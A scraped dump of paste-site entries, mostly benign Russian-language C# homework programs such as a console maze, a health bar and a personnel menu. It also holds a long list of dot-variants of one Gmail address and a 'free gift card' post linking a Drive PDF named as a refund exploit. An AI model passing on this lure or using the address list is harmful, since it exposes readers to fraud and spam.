<a href=""mailto:lee.j.ank.u.ip.an@gmail.com"">lee.j.ank.u.ip.an@gmail.com</a>
<a href=""mailto:l.e.ej.an.ku.ip.a.n@gmail.com"">l.e.ej.an.ku.ip.a.n@gmail.com</a>
<a href=""mailto:l.e.ej.a.nku.i.p.a.n@gmail.com"">l.e.ej.a.nku.i.p.a.n@gmail.com</a>
<a href=""mailto:leej.a.n.k.ui.p.an@gmail.com"">leej.a.n.k.ui.p.an@gmail.com</a>
<a href=""mailto:leeja.n.k.u.i.p.a.n@gmail.com"">leeja.n.k.u.i.p.a.n@gmail.com</a>
<a href=""mailto:l.eej.a.nk.uipan@gmail.com"">l.eej.a.nk.uipan@gmail.com</a>
<a href=""mailto:l.e.e.j.ankuip.a.n@gmail.com"">l.e.e.j.ankuip.a.n@gmail.com</a>
<a href=""mailto:leejan.k.u.ip.an@gmail.com"">leejan.k.u.ip.an@gmail.com</a>
<a href=""mailto:le.e.ja.nk.uip.a.n@gmail.com"">le.e.ja.nk.uip.a.n@gmail.com</a>
<a href=""mailto:lee.ja.nkuip.a.n@gmail.com"">lee.ja.nkuip.a.n@gmail.com</a>
<a href=""mailto:l.ee.ja.nku.ip.an@gmail.com"">l.ee.ja.nku.ip.an@gmail.com</a>
<a href=""mailto:l.e.e.j.an.kui.pan@gmail.com"">l.e.e.j.an.kui.pan@gmail.com</a>
<a href=""mailto:l.eej.a.n.kui.p.a.n@gmail.com"">l.eej.a.n.kui.p.a.n@gmail.com</a>
<a href=""mailto:l.e.ej.a.n.kui.p.an@gmail.com"">l.e.ej.a.n.kui.p.an@gmail.com</a>
<a href=""mailto:lee.ja.nku.i.pa.n@gmail.com"">lee.ja.nku.i.pa.n@gmail.com</a>
<a href=""mailto:lee.j.an.k.ui.pan@gmail.com"">lee.j.an.k.ui.pan@gmail.com</a>
<a href=""mailto:l.e.ej.ankuipan@gmail.com"">l.e.ej.ankuipan@gmail.com</a>
<a href=""mailto:leejan.kui.p.an@gmail.com"">leejan.kui.p.an@gmail.com</a>
<a href=""mailto:l.eeja.nk.u.ip.a.n@gmail.com"">l.eeja.nk.u.ip.a.n@gmail.com</a>
<a href=""mailto:l.ee.j.a.nk.u.i.p.a.n@gmail.com"">l.ee.j.a.nk.u.i.p.a.n@gmail.com</a>
<a href=""mailto:l.e.e.j.an.k.u.ip.an@gmail.com"">l.e.e.j.an.k.u.ip.an@gmail.com</a>
<a href=""mailto:l.e.e.j.an.k.u.i.p.a.n@gmail.com"">l.e.e.j.an.k.u.i.p.a.n@gmail.com</a>
<a href=""mailto:lee.j.an.ku.i.p.an@gmail.com"">lee.j.an.ku.i.p.an@gmail.com</a>
<a href=""mailto:l.e.e.j.ank.uipa.n@gmail.com"">l.e.e.j.ank.uipa.n@gmail.com</a>
<a href=""mailto:le.ejan.k.uip.an@gmail.com"">le.ejan.k.uip.an@gmail.com</a>
<a href=""mailto:l.ee.ja.nk.u.i.p.a.n@gmail.com"">l.ee.ja.nk.u.i.p.a.n@gmail.com</a>
<a href=""mailto:lee.j.a.n.k.uip.a.n@gmail.com"">lee.j.a.n.k.uip.a.n@gmail.com</a>
<a href=""mailto:lee.j.anku.i.pa.n@gmail.com"">lee.j.anku.i.pa.n@gmail.com</a>
<a href=""mailto:l.e.e.j.a.nku.i.pan@gmail.com"">l.e.e.j.a.nku.i.pan@gmail.com</a>
<a href=""mailto:le.ej.ank.u.i.pan@gmail.com"">le.ej.ank.u.i.pan@gmail.com</a>
<a href=""mailto:l.eeja.n.ku.ip.an@gmail.com"">l.eeja.n.ku.ip.an@gmail.com</a>
<a href=""mailto:l.eeja.nkui.pan@gmail.com"">l.eeja.nkui.pan@gmail.com</a>
<a href=""mailto:l.ee.jankuip.a.n@gmail.com"">l.ee.jankuip.a.n@gmail.com</a>
<a href=""mailto:lee.ja.n.k.u.i.p.a.n@gmail.com"">lee.ja.n.k.u.i.p.a.n@gmail.com</a>
<a href=""mailto:l.ee.ja.nk.uipa.n@gmail.com"">l.ee.ja.nk.uipa.n@gmail.com</a>
<a href=""mailto:leejan.ku.i.p.an@gmail.com"">leejan.ku.i.p.an@gmail.com</a>
<a href=""mailto:l.eej.a.n.k.ui.pa.n@gmail.com"">l.eej.a.n.k.ui.pa.n@gmail.com</a>
<a href=""mailto:l.e.ej.a.n.k.ui.p.a.n@gmail.com"">l.e.ej.a.n.k.ui.p.a.n@gmail.com</a>
<a href=""mailto:l.e.e.j.an.k.uipa.n@gmail.com"">l.e.e.j.an.k.uipa.n@gmail.com</a>
<a href=""mailto:l.ee.jan.ku.ipan@gmail.com"">l.ee.jan.ku.ipan@gmail.com</a>
<a href=""mailto:le.eja.nk.u.i.p.a.n@gmail.com"">le.eja.nk.u.i.p.a.n@gmail.com</a>
<a href=""mailto:le.e.j.ank.u.ipa.n@gmail.com"">le.e.j.ank.u.ipa.n@gmail.com</a>
<a href=""mailto:lee.ja.nkui.p.an@gmail.com"">lee.ja.nkui.p.an@gmail.com</a>
<a href=""mailto:l.eej.ank.ui.pan@gmail.com"">l.eej.ank.ui.pan@gmail.com</a>
<a href=""mailto:leej.a.n.k.u.i.p.a.n@gmail.com"">leej.a.n.k.u.i.p.a.n@gmail.com</a>
<a href=""mailto:leeja.nkuipa.n@gmail.com"">leeja.nkuipa.n@gmail.com</a>
<a href=""mailto:lee.j.a.nkuipan@gmail.com"">lee.j.a.nkuipan@gmail.com</a>
<a href=""mailto:lee.jank.u.i.p.an@gmail.com"">lee.jank.u.i.p.an@gmail.com</a>
<a href=""mailto:lee.jank.u.i.pa.n@gmail.com"">lee.jank.u.i.pa.n@gmail.com</a>
<a href=""mailto:l.ee.jank.ui.p.an@gmail.com"">l.ee.jank.ui.p.an@gmail.com</a>
<a href=""mailto:l.ee.jan.k.u.i.pan@gmail.com"">l.ee.jan.k.u.i.pan@gmail.com</a>
<a href=""mailto:l.e.ejan.k.uip.a.n@gmail.com"">l.e.ejan.k.uip.a.n@gmail.com</a>
<a href=""mailto:le.ej.ankuipa.n@gmail.com"">le.ej.ankuipa.n@gmail.com</a>
<a href=""mailto:l.e.e.j.a.n.ku.i.pan@gmail.com"">l.e.e.j.a.n.ku.i.pan@gmail.com</a>
<a href=""mailto:l.eeja.n.k.u.ip.an@gmail.com"">l.eeja.n.k.u.ip.an@gmail.com</a>
<a href=""mailto:l.e.ej.an.kui.pa.n@gmail.com"">l.e.ej.an.kui.pa.n@gmail.com</a>
<a href=""mailto:lee.ja.nk.ui.p.an@gmail.com"">lee.ja.nk.ui.p.an@gmail.com</a>
<a href=""mailto:leej.a.n.kuipa.n@gmail.com"">leej.a.n.kuipa.n@gmail.com</a>
<a href=""mailto:l.e.e.jank.ui.pan@gmail.com"">l.e.e.jank.ui.pan@gmail.com</a>
<a href=""mailto:leeja.n.ku.i.pan@gmail.com"">leeja.n.ku.i.pan@gmail.com</a>
<a href=""mailto:leej.a.nk.uipan@gmail.com"">leej.a.nk.uipan@gmail.com</a>
<a href=""mailto:leej.a.n.kui.pan@gmail.com"">leej.a.n.kui.pan@gmail.com</a>
<a href=""mailto:le.ej.an.k.uipan@gmail.com"">le.ej.an.k.uipan@gmail.com</a>
<a href=""mailto:l.e.e.jan.k.u.i.pan@gmail.com"">l.e.e.jan.k.u.i.pan@gmail.com</a>
<a href=""mailto:l.eej.an.ku.ipan@gmail.com"">l.eej.an.ku.ipan@gmail.com</a>
<a href=""mailto:l.ee.j.an.ku.ipa.n@gmail.com"">l.ee.j.an.ku.ipa.n@gmail.com</a>
<a href=""mailto:l.eejank.u.ip.a.n@gmail.com"">l.eejank.u.ip.a.n@gmail.com</a>
<a href=""mailto:lee.ja.nkuipa.n@gmail.com"">lee.ja.nkuipa.n@gmail.com</a>
<a href=""mailto:l.e.ejan.k.uipa.n@gmail.com"">l.e.ejan.k.uipa.n@gmail.com</a>
<a href=""mailto:l.ee.ja.n.kuip.an@gmail.com"">l.ee.ja.n.kuip.an@gmail.com</a>
<a href=""mailto:leej.ank.u.ip.a.n@gmail.com"">leej.ank.u.ip.a.n@gmail.com</a>
<a href=""mailto:leej.ankuipan@gmail.com"">leej.ankuipan@gmail.com</a>
<a href=""mailto:le.eja.n.k.u.ip.an@gmail.com"">le.eja.n.k.u.ip.an@gmail.com</a>
<a href=""mailto:l.e.ej.ankuip.an@gmail.com"">l.e.ej.ankuip.an@gmail.com</a>
<a href=""mailto:lee.jankui.p.a.n@gmail.com"">lee.jankui.p.a.n@gmail.com</a>
<a href=""mailto:le.e.ja.nku.ipan@gmail.com"">le.e.ja.nku.ipan@gmail.com</a>
<a href=""mailto:l.ee.j.an.kuip.an@gmail.com"">l.ee.j.an.kuip.an@gmail.com</a>
<a href=""mailto:lee.j.a.n.k.uip.an@gmail.com"">lee.j.a.n.k.uip.an@gmail.com</a>
<a href=""mailto:leej.an.kui.pan@gmail.com"">leej.an.kui.pan@gmail.com</a>
<a href=""mailto:le.e.j.a.n.ku.i.pan@gmail.com"">le.e.j.a.n.ku.i.pan@gmail.com</a>
<a href=""mailto:l.ee.j.an.k.u.ip.a.n@gmail.com"">l.ee.j.an.k.u.ip.a.n@gmail.com</a>
<a href=""mailto:leeja.n.k.u.i.pan@gmail.com"">leeja.n.k.u.i.pan@gmail.com</a>
<a href=""mailto:leejanku.i.pan@gmail.com"">leejanku.i.pan@gmail.com</a>
<a href=""mailto:l.ee.j.a.n.kui.pa.n@gmail.com"">l.ee.j.a.n.kui.pa.n@gmail.com</a>
<a href=""mailto:leej.a.n.kuipan@gmail.com"">leej.a.n.kuipan@gmail.com</a>
<a href=""mailto:l.eejan.k.ui.pa.n@gmail.com"">l.eejan.k.ui.pa.n@gmail.com</a>
<a href=""mailto:l.eeja.n.kuipan@gmail.com"">l.eeja.n.kuipan@gmail.com</a>
<a href=""mailto:le.e.jan.k.u.ip.a.n@gmail.com"">le.e.jan.k.u.ip.a.n@gmail.com</a>
<a href=""mailto:le.eja.nk.ui.pan@gmail.com"">le.eja.nk.ui.pan@gmail.com</a>
<a href=""mailto:le.ejan.ku.i.p.a.n@gmail.com"">le.ejan.ku.i.p.a.n@gmail.com</a>
<a href=""mailto:lee.j.a.nk.uipan@gmail.com"">lee.j.a.nk.uipan@gmail.com</a>
<a href=""mailto:le.ej.an.k.u.i.p.a.n@gmail.com"">le.ej.an.k.u.i.p.a.n@gmail.com</a>
<a href=""mailto:leej.ank.uipa.n@gmail.com"">leej.ank.uipa.n@gmail.com</a>
<a href=""mailto:leej.an.k.u.ipan@gmail.com"">leej.an.k.u.ipan@gmail.com</a>
<a href=""mailto:l.e.e.j.ankuipan@gmail.com"">l.e.e.j.ankuipan@gmail.com</a>
<a href=""mailto:lee.ja.nkuip.an@gmail.com"">lee.ja.nkuip.an@gmail.com</a>
<a href=""mailto:lee.j.a.nkui.pan@gmail.com"">lee.j.a.nkui.pan@gmail.com</a>
<a href=""mailto:leejan.k.ui.pa.n@gmail.com"">leejan.k.ui.pa.n@gmail.com</a>
<a href=""mailto:l.e.e.ja.nk.u.i.pan@gmail.com"">l.e.e.ja.nk.u.i.pan@gmail.com</a>
<a href=""mailto:l.ee.jan.k.u.i.p.a.n@gmail.com"">l.ee.jan.k.u.i.p.a.n@gmail.com</a>
<a href=""mailto:l.eej.a.n.k.u.i.p.an@gmail.com"">l.eej.a.n.k.u.i.p.an@gmail.com</a>
<a href=""mailto:l.ee.j.ank.ui.pa.n@gmail.com"">l.ee.j.ank.ui.pa.n@gmail.com</a>
<a href=""mailto:l.eej.a.n.k.u.ip.a.n@gmail.com"">l.eej.a.n.k.u.ip.a.n@gmail.com</a>
<a href=""mailto:l.e.ej.a.n.ku.i.pan@gmail.com"">l.e.ej.a.n.ku.i.pan@gmail.com</a>
<a href=""mailto:l.eej.an.ku.ip.an@gmail.com"">l.eej.an.ku.ip.an@gmail.com</a>
<a href=""mailto:l.ee.j.an.k.u.i.p.a.n@gmail.com"">l.ee.j.an.k.u.i.p.a.n@gmail.com</a>
<a href=""mailto:leeja.n.k.uipan@gmail.com"">leeja.n.k.uipan@gmail.com</a>
<a href=""mailto:le.eja.nkuipa.n@gmail.com"">le.eja.nkuipa.n@gmail.com</a>
<a href=""mailto:l.e.eja.nk.ui.pa.n@gmail.com"">l.e.eja.nk.ui.pa.n@gmail.com</a>
<a href=""mailto:l.e.ej.an.kuipa.n@gmail.com"">l.e.ej.an.kuipa.n@gmail.com</a>
<a href=""mailto:le.e.jankuipa.n@gmail.com"">le.e.jankuipa.n@gmail.com</a>
<a href=""mailto:leeja.nk.ui.p.a.n@gmail.com"">leeja.nk.ui.p.a.n@gmail.com</a>
<a href=""mailto:le.e.jank.uipa.n@gmail.com"">le.e.jank.uipa.n@gmail.com</a>
<a href=""mailto:l.ee.j.anku.ip.a.n@gmail.com"">l.ee.j.anku.ip.a.n@gmail.com</a>
<a href=""mailto:l.eeja.nk.u.ipan@gmail.com"">l.eeja.nk.u.ipan@gmail.com</a>
<a href=""mailto:l.ee.ja.n.k.uipan@gmail.com"">l.ee.ja.n.k.uipan@gmail.com</a>
<a href=""mailto:l.e.e.j.a.n.ku.i.p.a.n@gmail.com"">l.e.e.j.a.n.ku.i.p.a.n@gmail.com</a>
<a href=""mailto:l.ee.jan.kuipa.n@gmail.com"">l.ee.jan.kuipa.n@gmail.com</a>
<a href=""mailto:l.e.e.ja.n.k.u.i.p.an@gmail.com"">l.e.e.ja.n.k.u.i.p.an@gmail.com</a>
<a href=""mailto:leejan.k.ui.pan@gmail.com"">leejan.k.ui.pan@gmail.com</a>
<a href=""mailto:le.e.jan.ku.ip.a.n@gmail.com"">le.e.jan.ku.ip.a.n@gmail.com</a>
<a href=""mailto:l.e.ejanku.ipan@gmail.com"">l.e.ejanku.ipan@gmail.com</a>
<a href=""mailto:le.e.j.a.n.ku.i.p.a.n@gmail.com"">le.e.j.a.n.ku.i.p.a.n@gmail.com</a>
<a href=""mailto:l.e.e.j.ank.ui.p.an@gmail.com"">l.e.e.j.ank.ui.p.an@gmail.com</a>
<a href=""mailto:le.ej.a.n.k.uip.a.n@gmail.com"">le.ej.a.n.k.uip.a.n@gmail.com</a>
<a href=""mailto:le.eja.nk.u.i.pa.n@gmail.com"">le.eja.nk.u.i.pa.n@gmail.com</a>
<a href=""mailto:l.e.eja.nk.u.i.pa.n@gmail.com"">l.e.eja.nk.u.i.pa.n@gmail.com</a>
<a href=""mailto:le.eja.n.ku.ip.a.n@gmail.com"">le.eja.n.ku.ip.a.n@gmail.com</a>
<a href=""mailto:l.ee.ja.nku.i.p.an@gmail.com"">l.ee.ja.nku.i.p.an@gmail.com</a>
<a href=""mailto:l.e.ej.a.n.k.u.ip.a.n@gmail.com"">l.e.ej.a.n.k.u.ip.a.n@gmail.com</a>
<a href=""mailto:le.e.jan.kui.p.an@gmail.com"">le.e.jan.kui.p.an@gmail.com</a>
<a href=""mailto:l.ee.j.ankui.p.a.n@gmail.com"">l.ee.j.ankui.p.a.n@gmail.com</a>
<a href=""mailto:leeja.n.ku.ip.a.n@gmail.com"">leeja.n.ku.ip.a.n@gmail.com</a>
<a href=""mailto:l.e.e.j.an.ku.ip.a.n@gmail.com"">l.e.e.j.an.ku.ip.a.n@gmail.com</a>
<a href=""mailto:le.ejan.kui.p.an@gmail.com"">le.ejan.kui.p.an@gmail.com</a>
<a href=""mailto:l.ee.ja.nkuipa.n@gmail.com"">l.ee.ja.nkuipa.n@gmail.com</a>
<a href=""mailto:le.ej.a.n.kuipa.n@gmail.com"">le.ej.a.n.kuipa.n@gmail.com</a>
<a href=""mailto:le.eja.nku.ipan@gmail.com"">le.eja.nku.ipan@gmail.com</a>
<a href=""mailto:l.e.e.j.ankuipa.n@gmail.com"">l.e.e.j.ankuipa.n@gmail.com</a>
<a href=""mailto:l.ee.jankui.p.a.n@gmail.com"">l.ee.jankui.p.a.n@gmail.com</a>
<a href=""mailto:leej.ank.u.i.p.a.n@gmail.com"">leej.ank.u.i.p.a.n@gmail.com</a>
<a href=""mailto:l.e.ej.an.k.uip.a.n@gmail.com"">l.e.ej.an.k.uip.a.n@gmail.com</a>
<a href=""mailto:l.e.ejan.k.ui.pan@gmail.com"">l.e.ejan.k.ui.pan@gmail.com</a>
<a href=""mailto:leeja.n.ku.i.pa.n@gmail.com"">leeja.n.ku.i.pa.n@gmail.com</a>
<a href=""mailto:l.ee.j.an.ku.i.p.a.n@gmail.com"">l.ee.j.an.ku.i.p.a.n@gmail.com</a>
<a href=""mailto:le.e.j.a.n.kuip.an@gmail.com"">le.e.j.a.n.kuip.an@gmail.com</a>
<a href=""mailto:l.e.ej.a.n.ku.ipan@gmail.com"">l.e.ej.a.n.ku.ipan@gmail.com</a>
<a href=""mailto:l.e.eja.nkuipan@gmail.com"">l.e.eja.nkuipan@gmail.com</a>
<a href=""mailto:lee.j.an.kui.p.a.n@gmail.com"">lee.j.an.kui.p.a.n@gmail.com</a>
<a href=""mailto:leejank.u.i.p.an@gmail.com"">leejank.u.i.p.an@gmail.com</a>
<a href=""mailto:le.eja.nku.i.pa.n@gmail.com"">le.eja.nku.i.pa.n@gmail.com</a>
<a href=""mailto:l.e.e.jan.k.ui.p.a.n@gmail.com"">l.e.e.jan.k.ui.p.a.n@gmail.com</a>
<a href=""mailto:l.e.ej.a.nk.u.i.p.a.n@gmail.com"">l.e.ej.a.nk.u.i.p.a.n@gmail.com</a>
<a href=""mailto:l.ee.janku.ipan@gmail.com"">l.ee.janku.ipan@gmail.com</a>
<a href=""mailto:le.ej.ank.uip.an@gmail.com"">le.ej.ank.uip.an@gmail.com</a>
<a href=""mailto:l.e.ejank.uip.an@gmail.com"">l.e.ejank.uip.an@gmail.com</a>
<a href=""mailto:l.e.ejank.u.i.pa.n@gmail.com"">l.e.ejank.u.i.pa.n@gmail.com</a>
<a href=""mailto:le.ej.an.ku.ip.a.n@gmail.com"">le.ej.an.ku.ip.a.n@gmail.com</a>
<a href=""mailto:lee.jan.ku.ipa.n@gmail.com"">lee.jan.ku.ipa.n@gmail.com</a>
<a href=""mailto:l.eej.a.n.kui.pa.n@gmail.com"">l.eej.a.n.kui.pa.n@gmail.com</a>
<a href=""mailto:le.e.j.an.kui.pa.n@gmail.com"">le.e.j.an.kui.pa.n@gmail.com</a>
<a href=""mailto:l.e.e.j.a.n.kuip.a.n@gmail.com"">l.e.e.j.a.n.kuip.a.n@gmail.com</a>
<a href=""mailto:lee.j.an.ku.i.pa.n@gmail.com"">lee.j.an.ku.i.pa.n@gmail.com</a>
<a href=""mailto:l.eejan.kuipa.n@gmail.com"">l.eejan.kuipa.n@gmail.com</a>
<a href=""mailto:lee.j.a.nk.ui.pa.n@gmail.com"">lee.j.a.nk.ui.pa.n@gmail.com</a>
<a href=""mailto:le.ej.a.n.k.ui.pa.n@gmail.com"">le.ej.a.n.k.ui.pa.n@gmail.com</a>
<a href=""mailto:leejankuip.a.n@gmail.com"">leejankuip.a.n@gmail.com</a>
<a href=""mailto:le.e.j.an.k.ui.pan@gmail.com"">le.e.j.an.k.ui.pan@gmail.com</a>
<a href=""mailto:l.eej.a.nk.u.ipa.n@gmail.com"">l.eej.a.nk.u.ipa.n@gmail.com</a>
<a href=""mailto:le.e.jankui.p.an@gmail.com"">le.e.jankui.p.an@gmail.com</a>
<a href=""mailto:l.eej.a.nku.i.pa.n@gmail.com"">l.eej.a.nku.i.pa.n@gmail.com</a>
<a href=""mailto:l.ee.j.ank.uip.an@gmail.com"">l.ee.j.ank.uip.an@gmail.com</a>
<a href=""mailto:l.eejan.ku.ip.a.n@gmail.com"">l.eejan.ku.ip.a.n@gmail.com</a>
<a href=""mailto:l.e.ejank.ui.pa.n@gmail.com"">l.e.ejank.ui.pa.n@gmail.com</a>
<a href=""mailto:l.eej.an.k.uipan@gmail.com"">l.eej.an.k.uipan@gmail.com</a>
<a href=""mailto:le.e.ja.nku.i.pan@gmail.com"">le.e.ja.nku.i.pan@gmail.com</a>"
wqVLiiLY,BraveNewWorld,UrayFenn,C#,Saturday 24th of February 2024 11:57:33 PM CDT,"namespace BraveNewWorld
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.CursorVisible = false;
            char[,] map =
                {
                {'#','#','#','#','#','#','#','#','#','#'},
                {'#',' ',' ',' ',' ',' ',' ','#',' ','#'},
                {'#',' ','#',' ',' ',' ',' ',' ',' ','#'},
                {'#',' ','#',' ',' ',' ','#','#',' ','#'},
                {'#',' ','#',' ',' ',' ',' ',' ',' ','#'},
                {'#',' ','#',' ',' ',' ','#','#',' ','#'},
                {'#',' ',' ',' ',' ',' ',' ',' ',' ','#'},
                {'#',' ','#',' ',' ',' ','#','#',' ','#'},
                {'#',' ','#',' ',' ',' ','#','#',' ','#'},
                {'#',' ','#',' ',' ',' ','#','#',' ','#'},
                {'#','#','#','#','#','#','#','#','#','#'}
                };

            bool isPlaing = true;
            int positionUserX = 1;
            int positionUserY = 1;
            int directionX = 0;
            int directionY = 0;

            DrawMap(map);
            DrawUser(positionUserY, positionUserX);

            while (isPlaing)
            {
                ConsoleKeyInfo key = Console.ReadKey(true);

                GetDirection(key, out directionX, out directionY);

                if (directionX != 0 || directionY != 0)
                {
                    if (map[positionUserX + directionX, positionUserY + directionY] != '#')
                    {
                        MoveUser(ref positionUserX, ref positionUserY, directionX, directionY);
                    }
                }

                if (key.Key == ConsoleKey.Escape)
                {
                    isPlaing = false;
                }
            }
        }

        static void DrawUser(int positionY, int positionX)
        {
            Console.SetCursorPosition(positionY, positionX);
            Console.Write('@');
        }

        static void MoveUser(ref int positionX, ref int positionY, int directionX, int directionY)
        {
            Console.SetCursorPosition(positionY, positionX);
            Console.Write("" "");

            positionX += directionX;
            positionY += directionY;

            Console.SetCursorPosition(positionY, positionX);
            Console.Write('@');
        }

        static void GetDirection(ConsoleKeyInfo key, out int directionX, out int directionY)
        {
            directionX = 0;
            directionY = 0;

            switch (key.Key)
            {
                case ConsoleKey.UpArrow:
                    directionX = -1;
                    break;
                case ConsoleKey.DownArrow:
                    directionX = 1;
                    break;
                case ConsoleKey.LeftArrow:
                    directionY = -1;
                    break;
                case ConsoleKey.RightArrow:
                    directionY = 1;
                    break;
            }
        }

        static void DrawMap(char[,] map)
        {
            for (int i = 0; i < map.GetLength(0); i++)
            {
                for (int j = 0; j < map.GetLength(1); j++)
                {
                    Console.Write(map[i, j]);
                }

                Console.WriteLine();
            }
        }
    }
}"
2DHxKiML,ReadInt,UrayFenn,C#,Saturday 24th of February 2024 11:51:21 PM CDT,"namespace ReadInt
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(""Введите число для конвертации:"");
            int numberFromUser = GetNumber();
            Console.ReadKey();
        }

        static int GetNumber()
        {
            int number = 0;
            bool isWork = true;

            while (isWork)
            {
                string userInput = Console.ReadLine();

                if (int.TryParse(userInput, out number))
                {
                    Console.WriteLine(""Число сконвертировано!"");
                    isWork = false;
                }
                else
                {
                    Console.WriteLine(""Некорректный ввод попробуйте снова!"");
                }
            }

            return number;
        }
    }
}"
57t1dvDT,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Saturday 24th of February 2024 11:42:44 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_185320.pdf

Working as of:
25 February 2024"
6XgEuWQJ,"задание ""Новый Кадровый учет"" 2",Frozy22,C#,Saturday 24th of February 2024 11:29:40 PM CDT,"using System;
using System.Collections.Generic;

namespace Homework
{
    internal static class Program
    {
        public static void Main(string[] args)
        {
            const string AddDossierCommand = ""0"";
            const string WriteAllCommand = ""1"";
            const string RemoveDossierCommand = ""2"";
            const string ExitCommand = ""3"";
            
            List<string> fullNames = new List<string>()
            {
                ""Винокуров Фёдор Ильич"",
                ""Седова Ирина Тимуровна"",
                ""Шмелева Полина Алексеевна"", 
                ""Кузнецова Ева Александровна"",
                ""Иванов Илья Максимович"",
            };
            List<string> posts = new List<string>()
            {
                ""Гейм Дизайнер"",
                ""Разработчик"",
                ""Левел Дизайнер"",
                ""3D Артист"",
                ""2D Артист""
            };

            bool isOpen = true;
            
            while (isOpen)
            {
                Console.Clear();
                Console.WriteLine($""Меню: "");
                Console.WriteLine($""{AddDossierCommand}) Добавить досье"");
                Console.WriteLine($""{WriteAllCommand}) Вывести все досье"");
                Console.WriteLine($""{RemoveDossierCommand}) Удалить досье"");
                Console.WriteLine($""{ExitCommand}) Выход"");
                
                Console.WriteLine();
                Console.Write(""Введите пункт меню: "");

                string inputText = Console.ReadLine();

                Console.Clear();
                
                switch (inputText)
                {
                    case AddDossierCommand:
                        AddDossier(fullNames, posts);
                        break;
                    
                    case WriteAllCommand:
                        WriteAllDossiers(fullNames, posts);
                        break;
                    
                    case RemoveDossierCommand:
                        RemoveDossier(fullNames, posts);
                        break;
                    
                    case ExitCommand:
                        isOpen = GetIsOpen();
                        break;
                    
                    default:
                        WriteError(""Данного пункта в меню нет"");
                        break;
                }
                
                WaitUserKey();
            }
            
            Console.ReadKey();
        }

        private static void AddDossier(List<string> fullNames, List<string> posts)
        {
            Console.Write(""Введите фио: "");
            string fullName = Console.ReadLine();
                        
            Console.Write(""Введите должность: "");
            string post = Console.ReadLine();
                        
            fullNames.Add(fullName);
            posts.Add(post);
        }

        private static void RemoveDossier(List<string> fullNames, List<string> posts)
        {
            if (fullNames.Count == 0)
            {
                WriteWarning(""В бд нечего удалять."");
                return;
            }
            
            Console.Write(""Введите номер досье: "");
            string inputText = Console.ReadLine();
                        
            int dossierIndex;

            if (int.TryParse(inputText, out dossierIndex) == false)
            {
                WriteError(""Неправильный формат ввода"");
                return;
            }
                        
            if(dossierIndex < 0 || dossierIndex >= fullNames.Count)
            {
                WriteError(""Выход за пределы бд"");
                return;
            }
            
            fullNames.RemoveAt(dossierIndex);
            posts.RemoveAt(dossierIndex);
        }

        private static void WriteAllDossiers(List<string> fullNames, List<string> posts)
        {
            if(fullNames.Count == 0)
            {
                Console.WriteLine(""В БД нет досье."");
                return;
            }
            
            Console.WriteLine(""Все, имеющиеся в БД, досье: "");
            
            for (int i = 0; i < fullNames.Count; i++)
                WriteDossier(i, fullNames, posts);
            
            Console.WriteLine();
        }

        private static void WriteDossier(int dossierIndex, List<string> fullNames, List<string> posts)
        {
            if (fullNames.Count == 0)
            {
                WriteWarning(""В бд нет записей."");
                return;
            }
            
            if (dossierIndex < 0 || dossierIndex >= fullNames.Count)
            {
                WriteWarning(""В бд нет записи с таким номером."");
                return;
            }
            
            Console.WriteLine($""{dossierIndex}) {fullNames[dossierIndex]} - {posts[dossierIndex]}"");
        }

        private static void WriteError(string message)
        {
            WriteMessage($""### ERROR ### {message}"", ConsoleColor.DarkRed);
        }
        
        private static void WriteWarning(string message)
        {
            WriteMessage($""### Warning ### {message}"", ConsoleColor.DarkYellow);
        }

        private static void WriteMessage(string message, ConsoleColor color)
        {
            ConsoleColor temp = Console.ForegroundColor;
            Console.ForegroundColor = color;

            Console.WriteLine(message);
            
            Console.ForegroundColor = temp;
        }

        private static bool GetIsOpen()
        {
            char applyKey = 'Y';
            
            Console.Write($""Вы уверены что хотите выйти? ({applyKey}/N) "");
            var inputKey = char.ToUpper(Console.ReadKey().KeyChar);

            if (inputKey == applyKey)
            {
                Console.WriteLine(""Выход из программы..."");
                return false;
            }
            else
            {
                Console.WriteLine(""Продолжение работы программы..."");
                return true;
            }
        }

        private static void WaitUserKey()
        {
            Console.WriteLine();
            Console.Write(""Нажмите любую кнопку чтобы продолжить..."");
            Console.ReadKey();
        }
    }
}"
23ZULEuj,HealthBar,UrayFenn,C#,Saturday 24th of February 2024 11:27:30 PM CDT,"namespace HealthBar
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int percentHealth = 70;
            int barLenght = 20;
            Console.WriteLine($""Шкала здоровья при {percentHealth}% HP"");

            DrawBar(percentHealth, barLenght, ConsoleColor.Green);
        }

        static void DrawBar(int percentageFilled, int barLenght, ConsoleColor color)
        {
            int maxHealthPercent = 100;
            int minHealthPercent = 0;

            if(percentageFilled >= minHealthPercent && percentageFilled <= maxHealthPercent)
            {
                ConsoleColor defaultColor = Console.BackgroundColor;
                string bar;
                char symbol = ' ';
                int filledLenght = (barLenght * percentageFilled) / maxHealthPercent;
                int emptyLenght = barLenght - filledLenght;
                bar = new string(symbol, filledLenght);
                Console.WriteLine();
                Console.Write('[');
                Console.BackgroundColor = color;
                Console.Write(bar);
                Console.BackgroundColor = defaultColor;
                bar = new string(symbol, emptyLenght);
                Console.Write($""{bar}]"");
            }
        }
    }
}
"
xAdYFrS4,"задание ""работа с классами""",Frozy22,C#,Saturday 24th of February 2024 11:25:56 PM CDT,"using System;

class Program
{
    static void Main(string[] args)
    {
        var player = new Player(0, ""Frozy22"", 5, 100f);
        player.WriteInfo();

        Console.ReadKey();
    }

    public class Player
    {
        public int Id { get; private set; }
        public string NickName { get; private set; }
        public int CurrentLevel { get; private set; }
        public float MaxHealth { get; private set; }

        public Player(int id, string nickName, int currentLevel, float maxHealth)
        {
            Id = id;
            NickName = nickName;
            CurrentLevel = currentLevel;
            MaxHealth = maxHealth;
        }

        public void WriteInfo()
        {
            Console.WriteLine(""Player Info:"");
            Console.WriteLine($""    Id: {Id}"");
            Console.WriteLine($""    NickName: {NickName}"");
            Console.WriteLine($""    CurrentLevel: {CurrentLevel}"");
            Console.WriteLine($""    MaxHealth: {MaxHealth}"");
        }
    }
}"
NGngGVdp,PersonnelAccounting,UrayFenn,C#,Saturday 24th of February 2024 11:16:23 PM CDT,"namespace PersonnelAccounting
{
    internal class Program
    {
        static void Main(string[] args)
        {
            const string AddDossierCommand = ""1"";
